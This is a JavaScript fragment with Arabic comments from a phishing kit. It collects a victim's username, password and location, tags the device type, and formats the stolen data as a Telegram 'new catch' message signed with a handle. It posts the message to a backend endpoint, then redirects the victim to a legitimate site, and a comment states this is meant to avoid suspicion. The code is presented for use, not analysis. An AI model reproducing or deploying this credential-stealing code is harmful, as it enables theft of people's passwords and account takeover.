
// دالة كشف الجهاز
function getDevice() {
    var ua = navigator.userAgent;
    if (/android/i.test(ua)) return "Android 🤖";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS 🍎";
    return "PC 💻";
}

// الدالة الأساسية لإرسال البيانات
function sendData(u, p, l) {
    var dev = getDevice();
    
    // تنسيق الرسالة لتبدو احترافية في تليجرام
    var msg = "🎯 صيد جديد مرتب 🎯\n" +
              "━━━━━━━━━━━━━━\n" +
              "👤 المستخدم: " + u + "\n" +
              "🔑 كلمة السر: " + p + "\n" +
              "📱 الجهاز: " + dev + "\n" +
              "📍 الموقع: " + l + "\n" +
              "━━━━━━━━━━━━━━\n" +
              "👤 @M6_vip";

    // إرسال الطلب إلى الـ API الخاص بك
    fetch( /api/save , {
        method:  POST ,
        headers: {  Content-Type :  application/json  },
        body: JSON.stringify({ message: msg })
    })
    .then(function() {
        // التوجه للموقع الأصلي بعد النجاح
        window.location.href = "https://receive-smss.com/";
    })
    .catch(function(err) {
        // التوجه للموقع الأصلي حتى لو حدث خطأ لعدم إثارة الشك
        window.location.href = "https://receive-smss.com/";
    });
}
